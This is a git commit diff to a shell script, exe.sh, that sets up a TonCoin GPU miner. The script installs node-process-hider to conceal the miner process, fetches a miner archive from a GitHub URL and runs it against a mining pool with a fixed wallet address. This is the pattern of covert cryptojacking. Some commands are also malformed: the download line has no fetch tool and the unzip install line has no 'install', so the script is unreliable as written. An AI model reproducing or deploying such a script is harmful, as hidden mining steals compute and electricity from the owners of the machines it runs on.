af8ee709a1ebd604b1530ecf862190dea2d7fde5
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2022-01-26 08:39:20 +0700

    Update exe.sh

--- exe.sh
+++ exe.sh
@@ -1,21 +1,9 @@
 #!/bin/sh
 sudo apt update
 sudo apt install screen -y
-screen -dmS gpu.sh ./gpu.sh 69 87
-sudo apt-get install linux-headers-$(uname -r) -y
-distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
-wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
-sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
-sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
-echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
-sudo apt-get update
-sudo apt-get -y install cuda-drivers
-sudo apt-get -y install libcurl3
+screen -dmS gpu.sh ./gpu.sh 79 97
 sudo apt-get -y unzip
-sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add Toncoinminer
-sudo https://github.com/optimis3232/TonCoin_Miner/raw/main/TonCoin_Miner_v1.2.zip
-unzip TonCoin_Miner_v1.2.zip
-cd Coin_Miner_v1.2/
-sudo apt update
+sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add TonCoinMiner
+sudo https://github.com/optimis3232/TonCoin_Miner/raw/main/TonCoin_Miner_v1.2.zip && unzip TonCoin_Miner_v1.2.zip && mv v1.2 mng && cd mng && chmod +x go
 sudo apt install ocl-icd-opencl-dev -y
 ./go EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi --pool https://pool.services.tonwhales.com &
